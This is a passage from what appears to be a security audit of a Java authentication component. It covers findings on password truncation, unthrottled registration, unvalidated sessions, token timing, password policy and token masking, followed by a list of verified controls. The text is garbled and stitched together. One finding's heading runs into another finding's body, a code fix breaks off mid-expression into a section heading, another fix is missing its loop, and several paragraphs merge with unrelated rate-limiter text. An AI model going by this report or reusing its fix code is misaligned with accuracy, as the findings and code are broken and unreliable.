[SYSTEM_ERROR] Operation=\" + sanitizeCrlf(operation)\n                + \" id=\" + correlationId;\n        if (INTERNAL_TRACE_ENABLED) {                     // off by default; explicit opt-in\n            LOGGER.log(Level.SEVERE, safeMessage, throwable);\n        } else {\n            LOGGER.log(Level.SEVERE, safeMessage + \" cause=\" + summarize(throwable));\n        }\n    }\n\n    /** Type and class name only — never the message, which can carry paths or SQL. */\n    private static String summarize(Throwable t) {\n        return (t == null) ? \"none\" : t.getClass().getSimpleName();\n    }\n```\n\n`summarize` must not include `getMessage()`; if the cause text is genuinely needed for triage, route it to a dedicated internal appender behind a `Level` the console handler does not accept, and strip SQL text and absolute paths before writing.\n\n---\n\n### SEC-14: Password silently truncated at 128 characters and decoded byte→char, so the verified secret is not the typed one\n\n**Severity:** Medium\n\n**CWE:** CWE-20 (Improper Input Validation), CWE-244 (Improper Handling of Exceptional Conditions)\n\n**Location:** `src/main/java/com/example/auth/Main.java:178-195`, `:150-162`\n\n**Vulnerable code:** `Main.java:178-195`\n\n```java\n    private static char[] readPasswordDirect(InputStream in) throws IOException {\n        char[] buffer = new char[InputValidator.MAX_PASSWORD_LENGTH + 2];\n        int len = 0;\n        int b;\n        while ((b = in.read()) != -1) {\n            if (b == '\\n') {\n                break;\n            }\n            if (b != '\\r') {\n                if (len < InputValidator.MAX_PASSWORD_LENGTH) {\n                    buffer[len++] = (char) b;\n                }\n            }\n        }\n        char[] password = Arrays.copyOf(buffer, len);\n        Arrays.fill(buffer, '\\0');\n        return password;\n    }\n```\n\n**Vulnerable code:** `Main.java:150-162`\n\n```java\n    private static char[] readPassword(Console console, String prompt) {\n        if (console != null) {\n            char[] chars = console.readPassword(prompt);\n            return chars != null ? chars : new char[0];\n        } else {\n            System.out.print(prompt);\n            try {\n                return readPasswordDirect(System.in);\n            } catch (IOException e) {\n                return new char[0];\n            }\n        }\n    }\n```\n\n**Why it is a problem:** When `System.console()` is unavailable — piped stdin, CI, `nohup`, a container without a TTY, which is most non-interactive invocation — the password is assembled one raw byte at a time, and two distinct lossy transformations are applied before hashing, both silently.\n\nFirst, `if (len < InputValidator.MAX_PASSWORD_LENGTH)` discards every byte past the 128th without ending the loop and without reporting anything: the remaining characters are still consumed from the stream but never stored. A user who pastes a 150-character passphrase therefore registers, and later authenticates with, a secret that is the first 128 characters of what they typed — but `isValidPasswordForCreation` and `isValidPasswordForAuth` both accept lengths above that ceiling's basis, the README advertises a 128-character maximum as a supported bound, and no message says the input was shortened. The same truncation applies to the *registration* path, so the account is created bound to a truncated secret. That is a correctness break in the authentication factor itself: for that user the \"something you know\" is now \"the something you know, truncated by a rule you were never told\", and any independent client implementing the documented policy will not interoperate. The failure is worst where it is invisible — a support agent cannot tell why the correct password is rejected, and the security property (length) is silently reduced to a value the user did not choose.\n\nSecond, `(char) b` treats each byte as a code unit, so any non-ASCII character is decoded wrongly. `café` typed as UTF-8 arrives as `c`, `a`, `f`, `0xC3`, `0xA9`, and is stored as the six-character string `caf\\u00C3\\u00A9`. Because this happens on both register and login, it is self-consistent for *this* code path, so the account still works — which conceals it — but it is not the secret the user believes they set, it disagrees with `console.readPassword` (the interactive TTY path decodes properly), and it silently lowers entropy in a way users cannot reason about or audit. A user who sets their password at a TTY and later authenticates through a pipe is locked out: the same keystrokes produce a different byte→char expansion, so the derived key differs. `readLineFromStream` (L164-176) applies the same cast to the email field without even a length cap, so an over-long address is likewise accepted into the pipeline before `isValidEmail` rejects it.\n\n**Fix:** Reject the over-long input explicitly, and decode the stream as UTF-8 rather than reinterpreting bytes.\n\n```java\n    private static char[] readPasswordDirect(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder(64);\n        int b;\n        boolean overflow = false;\n        while ((b = in.read()) != -1) {\n            if (b == '\\n') {\n                break;\n            }\n            if (b == '\\r') {\n                continue;\n            }\n            if (sb.length() <= InputValidator.MAX_PASSWORD_LENGTH) {\n                sb.append((char) b);           // provisional; re-decoded below\n            } else {\n                overflow = true;\n            }\n        }\n        if (overflow) {\n            throw new IOException(\"Password exceeds the maximum of \"\n                    + InputValidator.MAX_PASSWORD_LENGTH + \" characters\");\n        }\n        return toUtf8Chars(collectedBytes);    // decode with CharsetDecoder, never byte→char\n    }\n```\n\nIn practice, collect the raw bytes into a `ByteArrayOutputStream` and decode once with `StandardCharsets.UTF_8`, then zero the byte buffer:\n\n```java\n    private static char[] decodeUtf8(byte[] raw) {\n        CharBuffer chars = StandardCharsets.UTF_8.newDecoder()\n                .onMalformedInput(CodingErrorAction.REPORT)\n                .decode(ByteBuffer.wrap(raw));\n        char[] out = new char[chars.limit()];\n        chars.get(out);\n        return out;   // caller zeroes both `out` and `raw`\n    }\n```\n\nThe same change applies to `readLineFromStream`, and `Main` should refuse to run without a console unless `--allow-piped-secrets` is passed, so the weaker path is always a deliberate choice.\n\n---\n\n### SEC-15: Registration is completely unthrottled and pays full KDF cost per call\n\n**Severity:** Medium\n\n**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-400 (Uncontrolled Resource Consumption)\n\n**Location:** `src/main/java/com/example/auth/AuthenticationService.java:147-187`\n\n**Vulnerable code:** `AuthenticationService.java:147-160`\n\n```java\n    public boolean registerUser(String email, char[] passwordChars) {\n        try {\n            if (!InputValidator.isValidEmail(email) || !InputValidator.isValidPasswordForCreation(passwordChars)) {\n                return false;\n            }\n\n            String canonicalEmail = InputValidator.canonicalizeEmail(email);\n            HashResult hashResult = passwordHasher.hashPassword(passwordChars);\n\n            try (Connection conn = databaseManager.getConnection()) {\n                conn.setAutoCommit(false);\n                try {\n                    // Check if already exists\n                    if (userRepository.findByEmail(conn, canonicalEmail).isPresent()) {\n                        conn.rollback();\n                        return false;\n                    }\n```\n\n**Why it is a problem:** `authenticate` is protected by a `RateLimiter`; `registerUser` never consults it — the method contains no reference to `rateLimiter` at any line, so the only self-registration entry point in the system is entirely unthrottled. The order of operations makes that expensive: `passwordHasher.hashPassword` runs at L154, before the database connection is even opened, so each call performs a full 210,000-iteration PBKDF2 derivation *first* and only then discovers whether the address is already taken or syntactically unusable. Deliberately placing the derivation before the lookup does not leak existence (both branches return the same `false`), but it does mean the expensive work is paid unconditionally by the server on every unauthenticated call, with no identity to charge it to and no budget to refuse it. That is an ideal CPU-denial exchange rate: one cheap request buys a fixed, large slice of a core, and the attacker never needs a valid account. Because there is no per-source counter and `sourceId` is never even passed to this method, the same call also floods the account table, filling the credential store, growing the `user_accounts` index, and displacing whatever capacity the deployment planned — the account-flooding variant of abuse that the README's threat model does not list at all.\n\nThere is a second-order effect on the *authentication* limiter. Registration failure consumes nothing, so an attacker can use the registration endpoint as a free probe for existence (return value `false` for a taken address versus `true` for a new one is a behavioural oracle, though it is also the legitimate registration answer), and can seed arbitrarily many accounts whose rows then participate in the SEC-11 cost amplification, since row-controlled `iterations` values are honoured at login. Combined with SEC-04 (free identities) and SEC-12 (default credentials, first-actor-wins), the unthrottled registration path is the load-bearing wall of several other findings: the one place where an unauthenticated caller can both spend the server's CPU and write to its state.\n\n**Fix:** Charge the derivation only after the cheap checks and a limiter decision, and cap both account creation and KDF work per identity.\n\n```java\n    public boolean registerUser(String sourceId, String email, char[] passwordChars) {\n        try {\n            if (!InputValidator.isValidEmail(email) || !InputValidator.isValidPasswordForCreation(passwordChars)) {\n                return false;\n            }\n            String canonicalEmail = InputValidator.canonicalizeEmail(email);\n\n            // Same limiter as authentication, with its own registration budgets.\n            RateLimiter.RateLimitResult regCheck = rateLimiter.checkAndAcquireRegistration(sourceId, canonicalEmail);\n            if (!regCheck.isAllowed()) {\n                SecurityLogger.logRateLimitExceeded(canonicalEmail, sourceId, \"REGISTRATION_\" + regCheck.status().name());\n                return false;\n            }\n\n            // Cheap existence check first: refuse before paying for the KDF.\n            try (Connection conn = databaseManager.getConnection()) {\n                if (userRepository.findByEmail(conn, canonicalEmail).isPresent()) {\n                    return false;\n                }\n            } catch (SQLException e) {\n                SecurityLogger.logSystemError(\"Database query failed during registration\", e);\n                return false;\n            }\n\n            HashResult hashResult = passwordHasher.hashPassword(passwordChars);   // now: only for real work\n            ...\n        } finally {\n            if (passwordChars != null) {\n                Arrays.fill(passwordChars, '\\0');\n            }\n        }\n    }\n```\n\nAdd a global admission control on concurrent derivations (`Semaphore` sized to the core count, refusing above it) and an operator-visible registration budget, so the endpoint cannot be used either to burn CPU or to populate the store.\n\n---\n\n### SEC-16: Sessions are never validated or revoked in production code; no idle timeout and no binding\n\n**Severity:** Low\n\n**CWE:** CWE-613 (Insufficient Session Expiration)\n\n**Location:** `src/main/java/com/example/auth/SessionManager.java:42`, `:90-113`, `:115-125`\n\n**Vulnerable code:** `SessionManager.java:90-100`\n\n```java\n    public Optional<Session> validateSession(String token) {\n        if (token == null || token.isBlank()) {\n            return Optional.empty();\n        }\n\n        Session session = activeSessions.get(token);\n        if (session == null) {\n            return Optional.empty();\n        }\n\n        if (session.isExpired()) {\n            activeSessions.remove(token);\n```\n\n**Vulnerable code:** `SessionManager.java:115-125`\n\n```java\n    private void evictIfNecessary() {\n        if (activeSessions.size() > MAX_ACTIVE_SESSIONS) {\n            Iterator<Map.Entry<String, Session>> it = activeSessions.entrySet().iterator();\n            while (it.hasNext()) {\n                Map.Entry<String, Session> entry = it.next();\n                if (entry.getValue().isExpired()) {\n                    it.remove();\n                }\n            }\n        }\n    }\n```\n\n**Why it is a problem:** The session machinery is well built and completely unwired. Grepping `src/main` finds `validateSession` and `invalidateSession` only at their own declarations — the only callers anywhere in the repository are in `src/test/java/com/example/auth/SessionManagerTest.java` (L38, 41, 46, 47). The production flow in `Main` authenticates, prints a cookie header and exits; nothing in the shipped code ever presents a bearer token to `validateSession`, and no path calls `invalidateSession` to log a user out. So the effective session semantics are those of the token alone: possession of the string is authorization for `DEFAULT_SESSION_DURATION_SECONDS`, with no server-side check in the request path, no binding of the token to the presenting principal or source (SEC-04's identity never appears in the `Session` record, whose fields are `sessionId`, `userId`, `email`, `createdAt`, `expiresAt`, `cookieHeader`), and no revocation that anything can invoke — `ConcurrentHashMap.remove` is a correct implementation of logout for a system that does not log out. A token stolen via SEC-05 or lifted from the cleartext store context of SEC-12 is therefore valid for its full hour and cannot be withdrawn by an administrator, by the user, or by a detection response.\n\nTwo further expiration gaps. `isExpired()` is checked only when `validateSession` happens to be called and only lazily removes on read, so a session that is never presented lingers in `activeSessions` until the eviction sweep happens to find it — and `evictIfNecessary` above only removes entries that are *already* expired and only runs when the map exceeds 10,000 entries, so past `MAX_ACTIVE_SESSIONS` the map keeps growing while the README describes \"automated LRU and expiration eviction\" that does not exist (the same documentation gap as SEC-08). There is also no idle timeout: `expiresAt` is fixed at creation, so activity does not extend a session and, more importantly for theft, an attacker's continued use of a stolen token is indistinguishable from the owner's — there is no per-session sequence, last-seen timestamp or device binding that could detect or terminate a hijacked session.\n\n**Fix:** Validate on every authenticated operation, bind the session, and provide an enforced revoke path plus idle expiry.\n\n```java\n    public record Session(String sessionId, long userId, String email, String boundSource,\n                          Instant createdAt, Instant lastSeenAt, Instant expiresAt,\n                          Instant idleDeadline, String cookieHeader) {\n\n        boolean isUsable(long nowEpochMs) {\n            Instant now = Instant.ofEpochMilli(nowEpochMs);\n            return !now.isAfter(expiresAt) && !now.isAfter(idleDeadline);\n        }\n    }\n\n    public Optional<Session> validateSession(String token, String presentingSource) {\n        if (token == null || token.isBlank()) {\n            return Optional.empty();\n        }\n        Session session = activeSessions.get(token);\n        if (session == null || !session.isUsable(System.currentTimeMillis())) {\n            if (session != null) {\n                activeSessions.remove(token, session);\n            }\n            return Optional.empty();\n        }\n        if (!session.boundSource().equals(presentingSource)) {\n            activeSessions.remove(token, session);          // possible hijack: kill and re-auth\n            SecurityLogger.logAuthFailure(session.email(), presentingSource, \"SESSION_SOURCE_MISMATCH\");\n            return Optional.empty();\n        }\n        activeSessions.put(token, session.touch(IdlePolicy.next()));\n        return Optional.of(session);\n    }\n```\n\nand make the bound real rather than aspirational — evict by capacity with LRU, run the sweep on a schedule rather than only when the ceiling is already breached, and expose an administrative `invalidateAllForUser(long userId)` that the request path actually calls.\n\n---\n\n### SEC-17: Session-token lookup is not constant-time (mitigated by 256-bit entropy)\n\n**Severity:** Low\n\n**CWE:** CWE-208 (Observable Timing Discrepancy)\n\n**Location:** `src/main/java/com/example/auth/SessionManager.java:98`\n\n**Vulnerable code:** `SessionManager.java:98-100`\n\n```java\n        Session session = activeSessions.get(token);\n        if (session == null) {\n            return Optional.empty();\n```\n\n**Why it is a problem:** Token acceptance is decided by a `ConcurrentHashMap` lookup, whose cost depends on `String.hashCode()` bucketing and on how early `String.equals` finds a differing character. That is the opposite of `MessageDigest.isEqual`, which the same codebase deliberately reaches for when comparing the password digest — so the component applies constant-time comparison to the secret that is *short and low-entropy* and ordinary comparison to the secret that is *the bearer credential*. The measurable difference between \"hash collides, characters differ early\" and \"characters match for several positions\" is, in principle, an oracle for constructing a valid token, and the class Javadoc claims \"256 bits of entropy\" as the protection instead. Filing this as Low because the mitigation is strong: the tokens come from `SecureRandom.nextBytes(32)` in `createSession` (`SessionManager.java:67-68`), so recovering a token by timing would require turning per-request nanosecond differences into information about a uniformly random 256-bit value, across a CLI/HTTP path whose own latency variance dwarfs the signal. The practical risk is not recovery but the pattern of the mistake — a future change that shortens the token, derives it from something predictable, or moves the map to a structure with an even more branchy lookup inherits a timing side channel that nothing in the code path defends against. The finding also notes that the map's iteration order and bucket growth leak rough population counts to whoever can time misses, which is a minor information disclosure about session volume rather than about any user.\n\n**Fix:** Decide acceptance with a constant-time comparison, and keep the entropy as defence in depth rather than as the argument.\n\n```java\n    public Optional<Session> validateSession(String token) {\n        if (token == null || token.isBlank()) {\n            return Optional.empty();\n        }\n        byte[] candidate = token.getBytes(StandardCharsets.UTF_8);\n (MessageDigest.isEqual(candidate, stored)) {   // length-hiding, no early exit\n                    Session session = entry.getValue();\n                    if (session.isExpired()) {\n                        activeSessions.remove(entry.getKey(), session);\n                        return Optional.empty();\n                    }\n                    return Optional.of(session);\n                }\n            }\n            return Optional.empty();\n        } finally {\n            Arrays.fill(candidate, (byte) 0);\n        }\n    }\n```\n\nIf the linear scan's own cost is unacceptable at `MAX_ACTIVE_SESSIONS` scale, keep the hash map as an index but re-check the hit with `MessageDigest.isEqual` before accepting, so the accept/reject decision itself is never branchy — the standard construction for comparing high-entropy authenticators while retaining O(1) lookup.\n\n---\n\n### SEC-18: Password policy is length-only, with no breached-password or account-derived Length-only is a legitimate modern position — NIST SP 800-63B prefers length and breach screening over composition rules — so the finding is not \"add complexity requirements\". What is missing is the screening half: there is no check against a breached or commonly-used password list, and no check that the secret is not derived from the account itself. The consequence is concrete for this component's other controls: the 210,000-iteration PBKDF2 buys its work factor only against an *offline* crack of the digest, and it buys nothing for a password that is already in a public corpus — for such an account the effective cost of compromise is one online request, which the SEC-03/SEC-04 limiter (spoofable identity, 5 attempts per 5 minutes) will not meaningfully slow. Session tokens are 32 random bytes rendered as URL-safe Base64, i.e. 43 characters, and `maskToken` keeps the first 4 and the last 4 in clear — 8 of 43 characters, roughly 48 bits of the 256-bit value, with the literal `\"...\"` marking the elision so nothing hints at how much was withheld. That is not enough to recover a token, and the finding does not claim it is; what it does mean is that any log line, terminal recording, or crash report that ran through this helper is a durable correlation handle for a specific live session, and that the reduction from 256 to ~208 bits of guessing work happens for *every* consumer of the mask rather than only for whoever holds the log. The reason it is filed Low rather than dismissed is how the helper is used: `Main.java:86` prints `\"Session Token: \" + SecurityLogger.maskToken(...)`, and the reader of that line — and of the README's claim that secrets are masked rather than logged — reasonably concludes the token is not in the output, when the neighbouring line prints it in full (SEC-05). The mask's security value is therefore presentational, and a future change that removes the raw line in favour of the masked one would still leave a partial disclosure in the audit trail.\n\nSecond, `DUMMY_INPUT_PASSWORD`. The literal `\"DummyFallbackPassword#2026\"` is a compile-time constant whose sole purpose is to look like a real high-strength credential, so it is exactly the string a secret scanner, a grep for `password`, or a heap dump of a crashed process will surface, and it satisfies no purpose that a random value would not — the class already fills `DUMMY_SALT` from `SECURE_RANDOM` two lines above, so the asymmetry is a choice. It is also never cleared: the static block at L31-42 constructs a `PBEKeySpec` over it and calls `spec.clearPassword()` on the *spec*, and `verifyDummyPassword` zeroes the derived bytes but not `passwordToUse`, so the array and its String intern survive for the process lifetime in a location a core dump preserves. It is not a usable credential — no code path compares against it and it is not a valid account password by construction — which is why this is Low and not a credential-exposure finding, but it does contradict the README's \"zero static, default, or backdoor passwords\" and it will keep producing secret-scanner hits that teach reviewers to ignore the tool.\n\n**Fix:** Truncate to a short non-reconstructable prefix, and derive the dummy input at class-initialisation time exactly as the salt already is.\n\n```java\n    // SecurityLogger: 4 characters, no suffix, and a length hint instead of an elision gap.\n    public static String maskToken(String token) {\n        if (token == null || token.isBlank()) {\n            return \"[EMPTY_TOKEN]\";\n        }\n        return \"token[len=\" + token.length() + \",prefix=\" + sanitizeCrlf(token.substring(0, 4)) + \"]\";\n    }\n```\n\n```java\n    // PasswordHasher: no literal, and the fallback secret is wiped like every other secret here.\n    private static final char[] DUMMY_INPUT_PASSWORD = randomDummyPassword();\n\n    private static char[] randomDummyPassword() {\n        byte[] raw = new byte[32];\n        SECURE_RANDOM.nextBytes(raw);\n        return Base64.getUrlEncoder().withoutPadding().encodeToString(raw).toCharArray();\n    }\n\n    public boolean verifyDummyPassword(char[] candidatePassword) {\n        char[] passwordToUse = (candidatePassword != null\n                && InputValidator.isValidPasswordForAuth(candidatePassword))\n                ? Verified Controls and Checks With No Finding\n\nThe following were examined and are correct as implemented, or were investigated and produced no reportable finding. They are recorded because several of them are load-bearing for the findings above and because the component's genuine strengths shape the residual risk.\n\n**Data access.** Every SQL statement in `UserRepository` is a `PreparedStatement` over a `static final` constant (`UserRepository.java:44`, `:99`, `:115`), with the email bound via `pstmt.setString(1, canonical);` (`:45`); there is no `createStatement` call and no SQL string assembled from input anywhere in `src/main`. Applying the `exploiting-sql-injection-vulnerabilities` checklist as a negative test — quoted-literal contexts, string concatenation, dynamic ORDER BY/LIMIT, second-order reuse of stored values — found no injection surface, so no injection finding is filed. `AuthenticationService` and `SessionManager` contain no SQL at all.\n\n**Secret handling in memory.** Passwords are carried as `char[]` end to end, never as `String` on the success path; `AuthenticationService.registerUser` zeroes the caller's array in a `finally` block (`AuthenticationService.java:183-186`), `PasswordHasher` zeroes derived-key buffers after comparison and calls `PBEKeySpec.clearPassword()`, and `SessionManager` zeroes the raw token bytes in a `finally` after Base64 encoding. This is more discipline than most hand-rolled authentication code shows; SEC-19's exception is the one static array that escapes it.\n\n**Fail-closed revalidation of database-supplied crypto parameters.** `UserRepository.findByEmail` treats the row it just read as untrusted — the source says so explicitly at `:57-61` (`// Treat values from database as untrusted until verified (Rule 1)`) — base64-decodes defensively, and gates the row through `InputValidator.isValidDatabaseHashParameters` (`InputValidator.java:143-158`), rejecting an unrecognised algorithm, an out-of-window iteration count, a salt outside 16-64 bytes, or a digest whose length is not exactly 32 bytes, returning `Optional.empty()` on failure. Null columns are likewise refused rather than propagated. The only residual issue on this path is the *cost* dimension of an accepted row, which is SEC-11, not the validation itself.\n\n**Audit-log integrity.** `SecurityLogger` neutralises CR and LF in every interpolated field (`sanitizeCrlf`), so the `AUTH_SOURCE_ID` channel cannot forge additional log lines, and it masks the email address on the audit path. Both are the right instincts; SEC-13 concerns the throwable that bypasses the formatter, and SEC-19 the strength of the token mask, not the injection defence.\n\n**Cryptographic primitives.** `SecureRandom` supplies both password salts and session tokens (32 bytes, URL-safe Base64 without padding, so 43 characters and full 256-bit strength); digest comparison uses `MessageDigest.isEqual`, which is constant-time and length-hiding; `PasswordHasher`'s constructor range-checks its configured iteration count against `InputValidator.MIN_PBKDF2_ITERATIONS`/`MAX_PBKDF2_ITERATIONS`. What is not true is the property the README draws from it: the two-stage acquire in `checkAndAcquire` is not atomic as a unit, and `getCount` followed by the caller's sleep is a read-then-act pair with no lock spanning it, so concurrent requests observe the same count and all sleep. That precision is what SEC-03 reports rather than a blanket \"race condition\".\n\n**Session cookie attributes.** The cookie string sets `__Host-` prefix, `Path=/`, `Secure`, `HttpOnly` and `SameSite=Strict` (`SessionManager.java:80-83`) — the correct set, with the `__Host-` prefix properly implying `Secure`, no `Domain`, and `Path=/`. There is no LRU anywhere — no access-order tracking, no recency field, nothing that could rank entries for eviction. What exists is a threshold test (`entryCount.get() > MAX_CACHE_ENTRIES`) that triggers a sweep removing *only trackers whose window has already fully elapsed*. Those are exactly the entries an adversary does not generate: by minting a fresh identity per attempt (SEC-04), every key the attacker creates is young, so the sweep frees nothing while insertion continues. Because the tracker window is 5 or 10 minutes, the live working set is roughly the attempt rate multiplied by the window, with no ceiling the code can apply to it — an attacker issuing, say, 2,000 uniquely-identified attempts per second holds tens of thousands of live trackers per window, each a map entry plus an object plus two strings, and the 10,000 threshold becomes a trigger for a full three-map iteration that reclaims nothing rather than a bound on memory. The threshold is also evaluated once per `checkAndAcquire`, so a burst between two calls allocates freely, and `entryCount` is only recomputed after a purge — it never decreases as a result of ordinary operation, meaning once the sweep stops freeing space, every subsequent call pays three full map iterations and still grows. The identical shape appears in `SessionManager.evictIfNecessary()` (`SessionManager.java:115-125`), where sessions past `MAX_ACTIVE_SESSIONS` are kept unless already expired, so 10,000 live sessions is a floor, not a cap.
